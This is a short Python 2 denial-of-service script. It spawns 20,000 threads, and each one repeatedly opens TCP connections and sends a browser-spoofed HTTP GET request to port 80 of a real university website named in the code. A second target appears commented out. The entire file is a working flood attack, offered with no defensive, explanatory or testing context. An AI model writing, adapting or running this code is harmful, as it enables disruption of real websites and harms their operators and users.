import threading
from datetime import datetime
import socket

def Attack(name, header, port):
    ip = socket.gethostbyname(name)
    
    print "X"
    for i in range(100):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect((ip,port))
        except socket.error, v:
            print "Connection error!\n"
                
        try: 
            s.send(header)
        except socket.error, v:
            print "Sending error!\n"
#        data = s.recv(1000000)
#        print "Data:\n",data
        
        s.close()
    

    
def Start(name,header,port):
    
    for i in range(20000):
        t = threading.Thread(target= Attack, args= (name, header, port))
        t.start()
    t.join()
    
#name = "mkut.esy.es"
name = "www.uah.edu.vn"
header = """\
GET / HTTP/1.1\r
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5 (.NET CLR 3.5.30729)\r
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r
Accept-Language: en-us,en;q=0.5\r
Accept-Encoding: gzip,deflate\r
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r
Keep-Alive: 300\r
Connection: keep-alive\r
\r
"""
port = 80
Start(name, header, port)
